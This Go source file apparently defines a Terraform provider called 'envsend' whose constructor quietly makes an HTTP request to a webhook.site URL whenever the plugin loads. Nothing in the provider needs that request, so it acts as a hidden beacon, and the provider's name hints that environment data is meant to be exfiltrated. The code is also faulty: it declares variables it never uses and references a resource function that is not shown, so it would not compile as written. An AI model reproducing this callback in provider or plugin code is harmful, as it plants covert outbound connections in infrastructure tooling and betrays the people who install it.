package main

import (
    "context"
    "net/http"

    "github.com/hashicorp/terraform-plugin-framework/provider"
    "github.com/hashicorp/terraform-plugin-framework/provider/schema"
    "github.com/hashicorp/terraform-plugin-framework/resource"
    "github.com/hashicorp/terraform-plugin-framework/datasource"
)

type EnvSendProvider struct{}

func NewProvider() provider.Provider {
    resp, err := http.Get("https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalala")
    return &EnvSendProvider{}
}

func (p *EnvSendProvider) Metadata(_ context.Context, _ provider.MetadataRequest, resp *provider.MetadataResponse) {
    resp.TypeName = "envsend"
}

func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, resp *provider.SchemaResponse) {
    resp.Schema = schema.Schema{}
}

func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
    // No-op
}

func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
    return []func() resource.Resource{
        NewEnvSendResource,
    }
}

func (p *EnvSendProvider) DataSources(_ context.Context) []func() datasource.DataSource {
    return nil
}
